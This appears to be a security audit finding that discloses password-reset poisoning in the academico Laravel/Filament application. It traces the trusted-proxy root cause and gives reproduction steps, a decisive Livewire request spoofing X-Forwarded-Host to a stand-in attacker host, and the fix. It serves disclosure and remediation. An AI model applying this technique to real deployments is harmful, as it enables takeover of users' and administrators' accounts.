# VULN-002 — Password-reset link built from attacker-controlled Host / `X-Forwarded-Host` → account takeover

| | |
|---|---|
| **ID** | VULN-002 |
| **Severity** | High |
| **CVSS 3.1** | 8.8 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| **Status** | **CONFIRMED (dynamic)** |
| **Affected commit** | `a6518355c3a30818044c46a9fc7fd53da34ab7f7` |
| **Auth required** | None (unauthenticated); victim must click the emailed link (`UI:R`) |
| **Attacker gains** | Full takeover of any account, including **admin**, and lock-out of the legitimate owner |

## Summary

The Filament admin panel's password-reset flow builds the reset link from the incoming
request's host. Because the application trusts all proxies
(`trustProxies(at: '*')`) and never pins its canonical root URL, an unauthenticated
attacker who adds `X-Forwarded-Host: evil.attacker.tld` to the reset-request POST causes
the *victim's* reset email to contain a link pointing at `evil.attacker.tld`, carrying
the genuine `email`, `token`, and `signature`. When the victim clicks it, the attacker's
server receives those parameters. The attacker replays them against the real server —
also spoofing the host so Laravel's `ValidateSignature` middleware recomputes and accepts
the signature — sets a new password, and owns the account. Proven live end-to-end: an
admin victim's password was changed to an attacker-chosen value; login with it succeeded
and the victim's original password stopped working.

## How it works (mechanism & code trace)

**Root cause 1 — all proxies trusted** (`targets/academico/bootstrap/app.php:16`):

```php
$middleware->trustProxies(at: '*');   // X-Forwarded-Host / -Proto honored verbatim
```

FrankenPHP terminates client connections directly here, so there is no legitimate proxy
setting these headers — they are pure client input, yet the app believes them.

**Root cause 2 — reset URL is derived from the request host with no pinning**
(`targets/academico/app/Providers/Filament/AdminPanelProvider.php:33`):

```php
->passwordReset()      // enabled; no ->trustHosts(), no URL::forceRootUrl(config('app.url')),
                       // no URL::forceScheme() anywhere in app/ or config/ (grep-confirmed)
```

Filament's reset notification generates the link with `URL::signedRoute(..., absolute: true)`.
An absolute route's root is `request()->root()`, i.e. `request()->getSchemeAndHttpHost()`,
which under `trustProxies('*')` returns the attacker's `X-Forwarded-Proto` + `X-Forwarded-Host`.
So the link becomes `https://evil.attacker.tld/admin/password-reset/reset?email=…&token=…&signature=…`
and the HMAC `signature` is computed over *that* attacker-hosted URL.

**Why the signature does not save it (correction to the report).** The report stated the
reset route "carries no `signed` middleware … so the signature is never enforced." That is
inaccurate — `route:list -v` shows the route does carry
`Illuminate\Routing\Middleware\ValidateSignature`, and it *is* enforced: replaying the
captured link to the real server **without** the host spoof returns **403** (the signature
was bound to `evil.attacker.tld`, not `localhost`). The true reason the protection is inert
is the same `trustProxies('*')`: `ValidateSignature` calls `URL::hasValidSignature($request)`,
which reconstructs the signed URL from `$request->url()` — and `$request->url()` honors the
spoofed `X-Forwarded-Host`. So when the attacker replays **with** `X-Forwarded-Host:
evil.attacker.tld`, the middleware recomputes the HMAC over `https://evil.attacker.tld/…`,
which matches the captured signature, and returns **200**. The signature check thus provides
no protection against an attacker who controls the host on both ends.

**The reset completion.** The rendered reset page is a Livewire component
(`Filament\Auth\Pages\PasswordReset\ResetPassword`) whose public properties include
`email`, `token`, `password`, `passwordConfirmation`. A `POST /livewire-<hash>/update`
setting `password`/`passwordConfirmation` and calling `resetPassword` invokes Laravel's
`PasswordBroker`, which validates the plaintext `token` against the hashed row in
`password_reset_tokens` and sets the new password. (The Livewire update endpoint has no
signature middleware, so only step 2 — rendering the form — needs the host spoof.)

## Why it is a vulnerability (reasoning)

The security boundary crossed is authentication itself: an unauthenticated outsider gains
authenticated control of an arbitrary account. The broken trust assumption is that the
`Host`/`X-Forwarded-Host` header reflects the application's own domain. A password-reset
token is a bearer secret whose entire security model depends on it being delivered *only*
to the account owner over a channel the application controls. By letting the attacker
choose the host, the app delivers that secret to the attacker instead — the token is still
"valid," it is simply sent to the wrong party. The `ValidateSignature` middleware is meant
to guarantee the link's integrity, but integrity of an attacker-chosen URL is worthless:
the attacker can produce a matching signature at will because they control the host that
both signing and verification key off. This is not by design — the intended behavior is
that a reset link points at the deployment's own domain (`config('app.url')`), which is
exactly what a fixed root URL would enforce.

## Reproduction

1. Bring the target up at `http://localhost:20000`. Ensure a working reset flow: the
   exploit renames `password_resets` → `password_reset_tokens` to match the shipped config
   default (`config/auth.php:96`), correcting the target's own migrate/revert mismatch that
   otherwise 500s the flow.
2. Run `./run.sh`. It creates a victim **admin** account, then:
   - POSTs the reset request with `X-Forwarded-Host: evil.attacker.tld`;
   - runs `queue:work --once` and reads the poisoned link out of `storage/logs/laravel.log`;
   - demonstrates replay 403 (no spoof) vs 200 (with spoof);
   - sets a new password via the reset form;
   - logs in as the victim with the new password.
3. Expected output (`run.log`, this run):
   ```
   victim's reset email links to host 'evil.attacker.tld' … token=cca399…  signature=25e678…
   replay WITHOUT host spoof -> HTTP 403        (signature enforced)
   replay WITH host spoof    -> HTTP 200        (signature bypassed)
   login with NEW password: True | login with OLD password: False
   ```
   Verdict: `CONFIRMED`. Decisive request (see `request.http`):
   ```
   POST /livewire-5f244c96/update
   X-Forwarded-Host: evil.attacker.tld
   X-Forwarded-Proto: https
   {"components":[{"snapshot":"<RequestPasswordReset snapshot>",
     "updates":{"data.email":"victim_<rnd>@example.invalid"},
     "calls":[{"path":"","method":"request","params":[]}]}]}
   ```

## Impact

Complete, unauthenticated takeover of any account whose owner clicks the poisoned reset
link — including the seeded **admin** (`academico@thomasdebay.com`), whose email is known.
Once an admin is owned, the whole application follows: it directly enables the
Critical [VULN-001] (an admin can trigger the invoice-PDF RCE) and grants control over all
student PII and financial data. Even without clicking, the flaw enables silent
reset-token *harvesting* for any targeted email. Blast radius: whole instance. Shares its
root cause with [VULN-008] (same `trustProxies('*')`).

## Suggested fix

Two changes, either of which blunts it; apply both:

1. **Restrict trusted proxies** — `targets/academico/bootstrap/app.php:16`:
   ```php
   $middleware->trustProxies(at: null);   // app faces clients directly; ignore forwarded host/proto
   ```
   (or an explicit allowlist of real proxy CIDRs). This also fixes [VULN-008].
2. **Pin the canonical root URL** so security-sensitive links never derive from the request
   host — in a service provider `boot()`:
   ```php
   URL::forceRootUrl(config('app.url'));
   URL::forceScheme('https');
   $middleware->trustHosts(at: [parse_url(config('app.url'), PHP_URL_HOST)]);  // reject unexpected Host
   ```
   Principle: generate bearer-token links from configuration, never from attacker-influenced
   request state; allowlist the Host.

## References

- PortSwigger Web Security Academy — **Password reset poisoning** (HTTP Host header attacks):
  <https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning>
- OWASP WSTG — **Testing for Host Header Injection** (WSTG-INPV) and *Forgot Password*
  functionality testing. <https://owasp.org/www-project-web-security-testing-guide/>
- OWASP Cheat Sheet — *Forgot Password*: send reset links to a server-fixed domain only.
- Laravel — *URL Signing* / `ValidateSignature`: the signature covers the absolute URL
  including host, so an attacker-controlled host makes it forgeable.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 80 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. GitHub Advisory Database query `academico`, NVD API `keywordSearch=academico`, OSV query `academico`, huntr repo page — only CVE-2025-10763 (`/edit-photo` upload); nothing on password reset or Host headers.
2. academico-sis/academico published advisories + issue/PR search `security` + `main` commit log through 2026-10-21 — no password-reset or host-header fix.
3. File histories: `bootstrap/app.php` — `6b71126` "trust proxies for traefik deployment" (Mar 2026) introduced the setting, nothing since; `app/Providers/Filament/AdminPanelProvider.php` — `0315821` "enable password reset option" (Apr 2026), no `trustHosts`/`forceRootUrl` since. Current `main` still has `trustProxies(at: '*')` and no `trustHosts`.
4. GitHub Advisory Database query `filament` (33 advisories reviewed by title) — no password-reset host-header advisory for filament/filament.
5. Sibling advisories compared: Coolify CVE-2026-34198 / GHSA-cgj8-7m5q-x5gv and AzuraCast CVE-2026-42606 / GHSA-gv7r-3mr9-h5x8 — same class, different products.

**Related but distinct public references** (same class or component, not this bug):
- CVE-2026-34198 / GHSA-cgj8-7m5q-x5gv (Coolify) — TrustProxies trusting all proxies + `X-Forwarded-Host` → poisoned reset link; identical root-cause pattern in a different Laravel product.
- CVE-2026-42606 / GHSA-gv7r-3mr9-h5x8 (AzuraCast) — `X-Forwarded-Host` password-reset poisoning; different product.
- GHSA-w76j-4qgr-3r9f / GHSA-x47v-xg6f-42xj (academico, 2026-10-19) — authorization issues in unrelated components.

**Reasoning:** No public disclosure describes password-reset poisoning in academico and the configuration is unchanged on `main`. The class is extremely well known (several 2026 CVEs in other Laravel apps), so rediscovery is easy and the project now has active external reporters, but nothing public matches this instance. All academico checks were direct GHSA/NVD/OSV/repository queries because the web-search quota was exhausted earlier in this triage.
